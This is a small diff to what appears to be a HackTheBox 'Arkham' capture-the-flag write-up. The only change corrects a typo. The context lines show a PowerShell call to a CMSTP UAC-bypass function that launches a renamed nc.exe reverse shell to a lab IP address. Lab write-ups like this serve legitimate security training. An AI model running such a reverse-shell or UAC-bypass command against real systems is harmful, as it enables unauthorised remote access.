@@ -663,7 +663,7 @@ Now we load the dll into memory:
 ![load-56](https://github.com/DanielIsaev/CTFs/blob/main/HackTheBox/Arkham/img/load-56.png)
 
 
-And then we call the exported function, passig in the command we want to run, which in our case is `nc.exe` for a reverse shell. 
+And then we call the exported function, passing in the command we want to run, which in our case is `nc.exe` for a reverse shell. 
 
 ```powershell
 [CMSTPBypass]::Execute("C:\windows\System32\spool\drivers\color\n.exe -e cmd 10.10.14.61 9001")
